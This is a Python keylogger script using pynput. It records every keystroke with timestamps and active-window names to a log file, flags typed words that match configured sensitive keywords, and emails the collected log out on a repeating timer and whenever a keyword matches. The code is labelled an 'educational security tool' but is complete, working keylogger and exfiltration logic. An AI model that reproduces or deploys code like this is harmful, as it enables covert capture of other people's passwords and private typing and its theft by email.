from pynput import keyboard
import datetime
import threading
import gw_helper
from email_sender import send_log_email
import config

current_word = ""
current_window = ""
session_start = datetime.datetime.now()
total_keys_typed = 0
alert_triggered = False


def log_entry(text, event_type="WORD"):
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    window = gw_helper.get_active_window()

    with open(config.LOG_FILE, "a") as f:
        f.write(f"[{timestamp}] [{window}] {event_type}: {text}\n")


def check_keywords(word):
    global alert_triggered

    for keyword in config.ALERT_KEYWORDS:
        if keyword.lower() in word.lower():
            print(f"\n[!] ALERT: Sensitive keyword detected: '{word}'")
            log_entry(f"KEYWORD MATCH: {word}", "ALERT")
            if not alert_triggered:
                send_log_email(reason=f"Keyword detected: {word}")
                alert_triggered = True
            return


def on_press(key):
    global current_word, total_keys_typed, alert_triggered
    total_keys_typed += 1

    try:
        current_word += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            if current_word:
                log_entry(current_word)
                check_keywords(current_word)
                current_word = ""
        elif key == keyboard.Key.enter:
            if current_word:
                log_entry(current_word)
                check_keywords(current_word)
            log_entry("[ENTER PRESSED]", "KEY")
            current_word = ""
        else:
            log_entry(f"[{key}]", "SPECIAL_KEY")


def on_release(key):
    if key == keyboard.Key.esc:
        if current_word:
            log_entry(current_word)
        print("\n[*] Stopping keylogger...")
        return False


def scheduled_email():
    global total_keys_typed

    if total_keys_typed >= config.MIN_KEYS_BEFORE_ALERT:
        send_log_email(reason="Scheduled interval report")
        total_keys_typed = 0

    threading.Timer(config.EMAIL_INTERVAL_SECONDS, scheduled_email).start()


def start_keylogger():
    print("=" * 60)
    print("   Keylogger Monitor - Educational Security Tool")
    print("=" * 60)
    print(f"[*] Session started: {session_start}")
    print(f"[*] Logging to: {config.LOG_FILE}")
    print("[*] Press ESC to stop.\n")

    log_entry("SESSION STARTED", "SYSTEM")
    scheduled_email()

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    start_keylogger()